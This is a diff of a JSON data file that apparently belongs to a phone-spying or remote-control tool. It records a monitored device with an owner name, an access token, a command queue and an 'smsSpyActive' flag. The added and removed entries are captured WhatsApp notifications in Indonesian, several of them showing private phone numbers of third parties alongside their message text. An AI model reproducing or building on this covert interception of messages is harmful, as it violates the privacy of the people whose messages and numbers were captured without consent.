@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776952008742,
+    "lastSeen": 1776952014739,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎73 pesan dari 41 chat",
+        "time": "23/04 21:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952016262
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Oi (12 pesan): Nakan",
+        "content": ".tag all",
+        "time": "23/04 21:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776952015983
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Oi (11 pesan): BEW STORE",
@@ -4003,22 +4019,6 @@
         "time": "23/04 19:15",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942921853
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "Telescopic bawa kembali ke markas",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942921838
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 822-6965-3769",
-        "content": "sipp",
-        "time": "23/04 19:15",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942921561
       }
     ],
     "galleryPhotos": [],
